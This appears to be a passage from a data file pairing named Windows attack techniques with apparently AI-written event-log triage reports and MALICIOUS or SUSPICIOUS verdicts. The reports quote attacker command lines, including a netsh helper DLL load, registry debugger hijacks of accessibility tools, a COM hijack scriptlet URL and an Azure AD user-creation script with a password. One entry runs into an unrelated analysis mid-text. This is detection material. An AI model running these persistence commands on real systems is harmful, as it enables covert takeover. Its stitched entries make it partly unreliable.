   - **Integrity Level:** The processes executed (e.g., `whoami.exe`, `hostname.exe`) have a High integrity level, which entails administrative execution rights. This aligns with the previous concern regarding potential privilege escalation tactics.

3. **Security Log:**
   - **Login Events:**
     - There is a login event for `admin_test` with elevated privileges, including `SeDebugPrivilege` and other significant rights. These are standard privileges for administrative accounts but combined with the abnormal behavior in Sysmon logs, could indicate malicious intent.
   
4. **Application Log:**
   - No correlated suspicious activity is evident within the application logs.
   
5. **Windows PowerShell Log:**
   - No data is present to analyze for this session.

**Assessment:**

- The execution of `cmd.exe` with a command that modifies system executables (`osk.exe`) to essentially replace it with a `cmd.exe` shell under administrative privileges is suspicious. This is a common technique used in attacks to maintain persistence or achieve privilege escalation by tricking users or systems to run a shell with elevated privileges using often-accessed executables.
  
- The activity details involve sensitive actions such as `takeown`, `icacls`, and `mklink` which are indicative of an attempt to manipulate file permissions and possibly bypass security measures.

**Resolution:**

- **MALICIOUS:** The behavior observed is strongly indicative of malicious activity, specifically a privilege escalation attempt. Further investigation, such as reviewing recent administrative activities or any unauthorized file changes or accesses, is recommended. Immediate containment and remediation actions, such as revoking suspicious administrative privileges or reversing unauthorized changes, should be taken."
Netsh Helper DLL Registration,"### Analysis of Windows Event Logs

#### Suspicious Behavior

1. **Unusual PowerShell and Cmd Executions**:
   - Multiple instances of `C:\Windows\System32\wevtutil.exe` executed by `SERVER002\admin_test`. `wevtutil.exe` is used for managing event logs, and seeing multiple occurrences in quick succession could indicate log manipulation attempts.
   - `cmd.exe` with the command line: `""cmd.exe"" /c netsh.exe add helper ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\NetshHelper.dll"" & taskkill /im notepad.exe /t /f > NUL 2>&1`. Injecting a DLL with `netsh.exe` is a known persistence mechanism or method to inject code into a process, which is suspicious and potentially malicious.

2. **Command Line Arguments**:

COM hijacking via TreatAs,"Upon reviewing the provided Windows event logs, I have identified several indicators that suggest potentially malicious behavior on the machine ""Server002"". Here’s the analysis:

### Indicators of Suspicious Activity:
1. **Registry Manipulation via PowerShell:**
   - The PowerShell logs show commands for adding registry keys and setting values under `HKEY_CURRENT_USER\SOFTWARE\Classes`. This includes creating a CLSID entry and associating it with a DLL (`scrobj.dll`), as well as providing a `ScriptletURL` pointing to an external URL on GitHub: `""https://github.com/file/file-file/raw/master/files/data.015/src/TreatAs.sct""`.
   - The use of `reg.exe` in the Sysmon logs and the CLSID manipulation are hallmark techniques of COM hijacking or living-off-the-land attacks.

2. **Use of `rundll32.exe`:**
   - `rundll32.exe` is being used to execute a scriptlet using the `fileTest` registry keys in a potentially malicious manner. This is often associated with fileless attacks where malicious code is executed directly in memory.

### Assessment:
The combination of PowerShell activities, registry modifications involving COM objects, downloading a scriptlet from an external URL, and executing via `rundll32.exe` strongly suggests that this is a likely compromise. These actions are consistent with techniques used in various attack frameworks, such as initial access or persistence mechanisms.

### Recommendations:
- **Immediate Isolation:** Isolate the affected host (""Server002"") from the network to prevent further potential lateral movement or data exfiltration.
- **Further Investigation:** Check for any network communications to the mentioned GitHub URL or related IP addresses, and identify any potential data exfiltration or lateral movement.
- **Memory Analysis:** Conduct a memory dump analysis on ""Server002"" to gather more evidence of malicious activities that may not be evident in the logs.
- **Review of Other Endpoints:** Consider scanning other endpoints for similar indicators of compromise, especially focusing on registry changes and unusual PowerShell activity.
- **Incident Response:** Initiate a full incident response protocol to determine the extent and nature of the compromise.

### Resolution:
The situation is assessed as **MALICIOUS** due to clear evidence of unauthorized and suspicious system modifications indicative of a potential compromise. Immediate response actions are warranted to mitigate any potential threats."
Adding custom debugger for Windows Error Reporting,"Upon reviewing the provided Windows event logs from the CEO's machine, let's break down the observation:

### System Log

1. **Time Change Events**:
   - There are several entries related to time changes (EventID 24 and 1), indicating the system clock was adjusted.
   - This activity is somewhat typical as it is associated with time synchronization (`time.windows.com`). No evidence directly suggests manipulation beyond regular sync operations.

2. **Time Service Events**:
   - The source of time is `time.windows.com`, which is standard, and the stratum number is reasonable. This does not indicate suspicious activity by itself.

### Sysmon Log

1. **Standard Windows Processes Execution**:
   - Execution of `HOSTNAME.EXE`, `CONHOST.EXE`, `WHOAMI.EXE`, and `CMD.EXE` are logged with high integrity levels by `admin_test`. These are legitimate processes.
   - The regular occurrence of `conhost.exe` is expected and not unusual, especially given the parent relations.

2. **Registry Modification via CMD**:
   - The command line seen in CMD.EXE (`""cmd.exe"" /c reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs"" /v Debugger /t REG_SZ /d ""C:\Windows\System32\notepad.exe"" /f`) indicates a registry modification setting a debugger command.
   - This action can be innocuous or malicious, depending on the context. Such adjustments might be an attempt to intercept crash handling.

3. **Wevtutil Usage**:
   - `wevtutil.exe` is referenced multiple times. It is a legitimate Windows tool used for event log configurations and management. Excessive use might require context, but isolated, it's not inherently malicious.

1. **Registry Modifications**: The script adds registry entries under the path `HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf` with a DLL path depending on whether a 64-bit or 32-bit version of Office is installed. It indicates potential malicious actions to modify registry keys which could be used for persistence or exploitation.
   
2. **COM Object Creation**: The script uses `New-Object -COMObject ""Word.Application""` to interact with Microsoft Word, potentially for leveraging macros or automation features in Word for further execution of malicious payloads.

3. **Process Manipulations**: The script stops any running instances of Word (`Stop-Process -Name ""WinWord""`) and restarts it (`Start-Process ""WinWord""`), which can be indicative of an attempt to either deploy or clean up textual payloads or hooks.

### Analysis of Sysmon Logs

The Sysmon logs reveal process creation activities that are of interest:

1. **PowerShell Execution**: Execution of `powershell.exe` with command strings that match those described in the PowerShell logs indicates that the script was executed externally and logged by Sysmon.

2. **Processes Spawned by Admin User**: Several instances of processes like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` are created by `SERVER002\admin_test`, showing activity that’s unusual in the context unless part of a regular scripted task, which there is no indication of.

3. **Service and System Processes**: Processes such as `TrustedInstaller.exe`, `TiWorker.exe`, `sppsvc.exe`, or `MicrosoftEdgeUpdate.exe` executed under `NT AUTHORITY` system-level accounts appear normal and align with standard system processes carrying out usual maintenance or update tasks.

### Suspicions & Indicators of Compromise

- The creation and modification of registry entries, coupled with COM object use in PowerShell, usually align with techniques used to maintain persistence or prepare a system for further exploitation. The specific registry path (for an Office test) is particularly odd as it doesn't align with known legitimate software behaviors.

- The stopping and restarting of the Word process in the script may indicate attempts to hijack or alter processes for execution of unenforced code.
  
- The host displaying multiple console operations (`hostname`, `whoami`, etc.) under an admin account is suspicious, indicating a degree of manual investigation or script-based reconnaissance, often seen in lateral movement stages following an initial compromise.

### Assessment

Given the combination of unusual registry operations, PowerShell scripting to stop/start Word, and multiple executions of system utilities under an admin-level account, there is significant evidence pointing to potentially malicious behavior.

### Conclusion

**Resolution**: MALICIOUS

The events in the logs suggest that potentially malicious activities were executed, likely aiming to exploit vulnerabilities, gain persistence, or gather reconnaissance information on the system. 

### Recommended Actions

1. **Isolate the system**: Prevent potential lateral movement or data exfiltration.
   
2. **Conduct a full investigation**: Analyze the affected system for additional indicators of compromise, malicious software, or signs of data tampering.

3. **Review registry and scheduled tasks**: Look for additional persistence mechanisms.

4. **Verify user activities**: Cross-examine user actions and permissions, ensuring no unauthorized access.

5. **Engage in remediation activities**: Remove any identified malicious software, restore affected settings, and update system defenses against similar attack vectors.

6. **Monitor and log system activity**: Setup enhanced logging for future detection of the identified patterns."
Install IIS Module using AppCmd.exe,"Upon analyzing the provided Windows event logs, several interesting patterns and behaviors warrant further scrutiny:

### Key Observations:

1. **Frequent Execution of Edge Update Processes:**
   - There are numerous Sysmon logs indicating the execution of various Microsoft Edge Update processes such as `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86.exe`, and `MicrosoftEdgeUpdateComRegisterShell64.exe`. They are executed with parameters like `/svc`, `/regsvc`, `/update`, etc., which are typical for application update processes.
   - These executions are performed under the `NT AUTHORITY\SYSTEM` user, indicating high-level privileges consistent with system service updates.
   - The consistent SHA256 hashes across several executions suggest the files have not been tampered with and maintain integrity.

2. **Presence of PowerShell and Command Line Activities:**
   - A PowerShell command is executed (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) by a user `SERVER002\admin_test`. Without further command details, it's difficult to assess the intent; however, PowerShell is often utilized in administrative automation or, concerningly, in malicious scripts.
   - A `cmd.exe` command is executed with an argument targeting IIS configuration (`appcmd.exe install module`), which could signify setup tasks or potentially illicit actions if unsanctioned.

3. **Unusual Processes and Timing:**
   - The rapid succession of processes such as `conhost.exe`, `wevtutil.exe`, and `cmd.exe` initiated by the `admin_test` user is noteworthy. These processes support command-line interfaces, event log management, and command execution, respectively, and might indicate either legitimate administrative operations or attempts at process manipulation or privilege escalation.

4. **Software Protection Platform Service:**
   - The log entry from the `Software Protection Platform Service` seems routine but coincides with other process activities. It points to potential validation or licensing checks rather than unauthorized actions.

### Assessment:

While the majority of the observed activity could be characteristic of routine system updates and administrative management, certain elements are marked by potential risk indicators, such as:

- Frequent process execution, including Edge updates, which albeit could be routine, might include unwanted software if originating from unauthorized updates.
- Use of tools like PowerShell and command-line interfaces by administrative users in close succession could point to orchestrated administrative tasks or, alternatively, scripted automation unauthorized by IT policy.

### Recommended Resolution:
- **Resolution: SUSPICIOUS**

### Guidance for Further Action:
1. **Verification of Updates:** Confirm the legitimacy of the Edge update processes to ensure they're part of the standard deployment schedule and not rogue installations.
2. **Review of Admin Actions:** Seek additional context on the PowerShell and command-line operations executed by `SERVER002\admin_test` to validate whether these are sanctioned administrative activities.
3. **Enhanced Monitoring:** Increase monitoring on `Server002` and particularly scrutinize activities under the `admin_test` account for unauthorized changes or command executions indicating a sophisticated attack vector.
4. **Check System Integrity:** Utilize endpoint security tools to scan for malware or unauthorized changes, particularly focusing on executable files in system directories.
5. **User Verification:** Confirm with the user(s) linked to `admin_test` that these actions were intentional and within their expected role activities.

Continuing investigation along these lines will help in affirming whether these activities are benign or part of a more sophisticated exploitation attempt requiring mitigation."
Attaches Command Prompt as a Debugger to a List of Target Processes,"### Detailed Analysis of the Logs

#### 1. Suspicious or Anomalous Behavior
Upon reviewing the provided logs, several potentially suspicious activities were identified:

- **Security Log & Sysmon Log:** There is a sequence of PowerShell command executions designed to modify registry entries for several accessibility applications (`osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe`). The script registers `cmd.exe` as the debugger for these applications, a technique typically associated with privilege escalation attempts. This activity was executed under a high integrity context by the user `SERVER002\admin_test`.  

- **Security Log Event 4672:** This event shows that the `SYSTEM` account was granted a range of high-level privileges, such as `SeDebugPrivilege`, `SeAssignPrimaryTokenPrivilege`, etc. While these privileges are normal for system-level processes, when seen in conjunction with the above registry modification, it raises suspicion about potential misuse.

- **Sysmon Log:** Several instances of `wevtutil.exe` and `conhost.exe` running under `SERVER002\admin_test` were noted. The use of `wevtutil.exe` to export logs (`epl Microsoft-Windows-Sysmon/Operational`) is another tool often leveraged by attackers for log tampering or examination of system events.

- **PowerShell Log:** It specifically confirms the execution of a PowerShell script performing the registry modifications as described above, which are common prelude to a persistence or privilege escalation attempt.

#### 2. Indication of Malicious Activity
The series of events related to the PowerShell script execution indicate an abuse of accessibility settings to potentially enable a user to launch a system command prompt (cmd.exe) with elevated privileges. This is a classic indication of a malicious intent designed to subvert standard security controls by using accessibility features, often seen in penetration testing or attacks.

### Assessment and Resolution

The logs indicate a sophisticated attempt to gain elevated privileges and potentially maintain persistence on the system. While some activities may seem typical in isolation, the combination and sequence, especially the PowerShell script modifying the registry, strongly suggest malicious activity.

**Resolution: MALICIOUS**

#### Guidance on How to Proceed
- **Containment:** Immediately isolate the affected system to prevent further potential lateral movement or data exfiltration.
  
- **Investigation:** Perform a forensic investigation to determine how the `admin_test` account may have been compromised or if a legitimate user performed these actions under coercion or without understanding the impact.

- **Remediation:** Remove or reverse unauthorized registry modifications and inspect other systems for similar changes.

- **Monitoring:** Increase monitoring on similar systems and activate alerts for unusual `PowerShell` and `wevtutil` activity.

- **Report:** Coordinate with legal and compliance teams if data integrity or regulatory issues are potentially impacted.

This coordinated sequence of actions will help mitigate ongoing threats and protect against future incursions leveraging similar tactics."
Azure AD - Create a new user,"### Detailed Analysis

**1. Suspicious or Anomalous Behavior Identified:**

- **PowerShell Activity**: There are multiple instances of PowerShell execution logs indicating the use of a script to create a new Azure AD user with potentially high privileges. The specific command observed is:
  ```plaintext
  powershell.exe & {Connect-AzureAD, $userprincipalname = ""file@yourdomain.com"", $username = ""file"" , $password = ""reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg"", New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username}
  ```
  This implies unauthorized manipulation of Azure AD accounts, which is a severe security risk.

- **Process Creation Events**: There are several process creation events of `powershell.exe` with suspicious command lines related to the above Azure AD activity. Moreover, numerous `conhost.exe` processes seem to be spawned during the PowerShell and other system operations suggesting the interaction with command-line environments.
